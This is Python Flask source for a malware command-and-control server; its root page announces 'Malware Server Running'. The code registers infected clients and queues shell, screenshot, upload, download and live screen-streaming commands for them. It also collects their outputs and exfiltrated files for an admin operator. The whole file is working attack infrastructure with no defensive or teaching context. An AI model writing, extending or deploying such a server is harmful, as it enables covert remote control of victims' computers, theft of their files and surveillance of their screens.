    import os
    import uuid
    import time
    from flask import Flask, request, jsonify, send_file, Response
    from werkzeug.utils import secure_filename

    app = Flask(__name__)

    # --- Global State (In-Memory) ---
    # In a real production app, use a database (Redis/SQLite/Postgres)
    # clients = {
    #   "client_id": {
    #       "ip": "1.2.3.4",
    #       "last_seen": <timestamp>,
    #       "command_queue": [ {"id": "uid", "cmd": "..."} ],
    #       "results": { "cmd_uid": "result_data" }
    #   }
    # }
    clients = {}

    # Folder to store uploaded files
    UPLOAD_FOLDER = 'uploads'
    if not os.path.exists(UPLOAD_FOLDER):
        os.makedirs(UPLOAD_FOLDER)

    app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

    # Streaming state
    streaming_clients = {}  # {client_id: {"active": True, "last_frame": None, "frame_time": 0}}

    # --- Helpers ---

    def clean_clients():
        """Remove dead clients (inactive > 60s)"""
        now = time.time()
        dead = []
        for cid, data in clients.items():
            if now - data['last_seen'] > 60:
                dead.append(cid)
        for d in dead:
            del clients[d]
            # Also clean up streaming state for dead clients
            if d in streaming_clients:
                del streaming_clients[d]

    # --- Client API Endpoints ---

    @app.route('/api/register', methods=['POST'])
    def register():
        """Client first check-in"""
        ip = request.remote_addr
        # Try to keep same ID if provided, else new
        data = request.json or {}
        client_id = data.get('id')
        public_ip = data.get('public_ip', ip)  # Use client-provided public IP or fallback to remote_addr
        
        if not client_id or client_id not in clients:
            client_id = str(uuid.uuid4())[:8]
            
        clients[client_id] = {
            "ip": public_ip,  # Store the public IP
            "last_seen": time.time(),
            "command_queue": [],
            "results": {},
            "streaming": False
        }
        
        print(f"[+] Client registered: {client_id} from {public_ip}")
        return jsonify({"id": client_id, "status": "registered"})

    @app.route('/api/poll', methods=['POST'])
    def poll():
        """Client checks for commands"""
        data = request.json or {}
        client_id = data.get('id')
        
        if not client_id or client_id not in clients:
            return jsonify({"error": "Unknown client, re-register"}), 404
            
        # Update heartbeat
        clients[client_id]['last_seen'] = time.time()
        
        # Check queue
        queue = clients[client_id]['command_queue']
        if queue:
            # Pop one command
            cmd = queue.pop(0)
            return jsonify({"command": cmd})
        
        return jsonify({"command": None})

    @app.route('/api/result', methods=['POST'])
    def result():
        """Client sends result of a command"""
        data = request.json or {}
        client_id = data.get('id')
        cmd_id = data.get('cmd_id')
        output = data.get('output')
        
        if not client_id or client_id not in clients:
            return jsonify({"error": "Unknown client"}), 404
            
        if cmd_id:
            clients[client_id]['results'][cmd_id] = output
            print(f"[*] Result received for {cmd_id} from {client_id}")
            
        return jsonify({"status": "ok"})

    @app.route('/api/upload', methods=['POST'])
    def upload_file():
        """Client uploads a file (screenshot or downloaded file)"""
        try:
            client_id = request.form.get('id')
            cmd_id = request.form.get('cmd_id')
            is_stream_frame = request.form.get('is_stream_frame', 'false') == 'true'
            print(f"DEBUG: /api/upload client_id={client_id}")
            
            if client_id != 'ADMIN' and (not client_id or client_id not in clients):
                print(f"DEBUG: Unknown client rejection. ID: {client_id}")
                return jsonify({"error": "Unknown client"}), 404
            
            if 'file' not in request.files:
                return jsonify({"error": "No file part"}), 400
            
            file = request.files['file']
            if file.filename == '':
                return jsonify({"error": "No selected file"}), 400
            
            # For streaming frames, store directly in memory
            if is_stream_frame:
                file_data = file.read()
                if client_id not in streaming_clients:
                    streaming_clients[client_id] = {}
                streaming_clients[client_id]['last_frame'] = file_data
                streaming_clients[client_id]['frame_time'] = time.time()
                return jsonify({"status": "frame_received"})
            
            # Save file for regular uploads
            filename = secure_filename(f"{client_id}_{int(time.time())}_{file.filename}")
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            file.save(filepath)
            
            # Store the filename/path as the result for the admin to retrieve later
            if cmd_id:
                clients[client_id]['results'][cmd_id] = f"FILE_UPLOADED:{filename}"
                
            return jsonify({"status": "uploaded", "filename": filename})
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    # --- Admin API Endpoints ---

    @app.route('/admin/list', methods=['GET'])
    def admin_list():
        """List active clients"""
        clean_clients()
        active = []
        for cid, data in clients.items():
            active.append({
                "id": cid,
                "ip": data['ip'],
                "last_seen": int(time.time() - data['last_seen'])
            })
        return jsonify(active)

    @app.route('/admin/command', methods=['POST'])
    def admin_command():
        """Admin schedules a command"""
        data = request.json or {}
        target_id = data.get('target_id')
        cmd_type = data.get('type') # 'shell', 'screen', 'upload', 'download'
        cmd_params = data.get('params', "")
        
        if not target_id or target_id not in clients:
            return jsonify({"error": "Client not found"}), 404
            
        cmd_id = str(uuid.uuid4())[:8]
        command = {
            "id": cmd_id,
            "type": cmd_type,
            "params": cmd_params
        }
        
        # Handle streaming commands
        if cmd_type == 'start_stream':
            clients[target_id]['streaming'] = True
            if target_id not in streaming_clients:
                streaming_clients[target_id] = {}
        elif cmd_type == 'stop_stream':
            clients[target_id]['streaming'] = False
            if target_id in streaming_clients:
                del streaming_clients[target_id]
        
        clients[target_id]['command_queue'].append(command)
        return jsonify({"cmd_id": cmd_id, "status": "queued"})

    @app.route('/admin/response/<cmd_id>', methods=['GET'])
    def admin_response(cmd_id):
        """Admin polls for result of specific command"""
        # Search all clients for this cmd_id result
        # Inefficient for many clients, but fine for small scale
        for cid, data in clients.items():
            if cmd_id in data['results']:
                res = data['results'].pop(cmd_id) # Consume result
                return jsonify({"status": "done", "output": res})
                
        return jsonify({"status": "pending"})

    @app.route('/admin/download_file/<filename>', methods=['GET'])
    def admin_download(filename):
        """Admin downloads a file uploaded by client"""
        try:
            safe_filename = secure_filename(filename)
            filepath = os.path.join(app.config['UPLOAD_FOLDER'], safe_filename)
            if os.path.exists(filepath):
                return send_file(filepath)
            return jsonify({"error": "File not found"}), 404
        except Exception as e:
            return jsonify({"error": str(e)}), 500

    @app.route('/admin/stream_frame/<client_id>', methods=['GET'])
    def admin_stream_frame(client_id):
        """Admin gets latest stream frame from client"""
        if client_id in streaming_clients:
            frame_data = streaming_clients[client_id].get('last_frame')
            if frame_data:
                return Response(frame_data, mimetype='image/jpeg')
        return jsonify({"error": "No frame available"}), 404

    @app.route('/admin/stream_status/<client_id>', methods=['GET'])
    def admin_stream_status(client_id):
        """Check if client is streaming"""
        if client_id in clients:
            return jsonify({"streaming": clients[client_id].get('streaming', False)})
        return jsonify({"streaming": False})

    @app.route('/')
    def index():
        return "Malware Server Running. Use Admin Client."

    if __name__ == '__main__':
        port = int(os.environ.get('PORT', 5000))
        app.run(host='0.0.0.0', port=port)


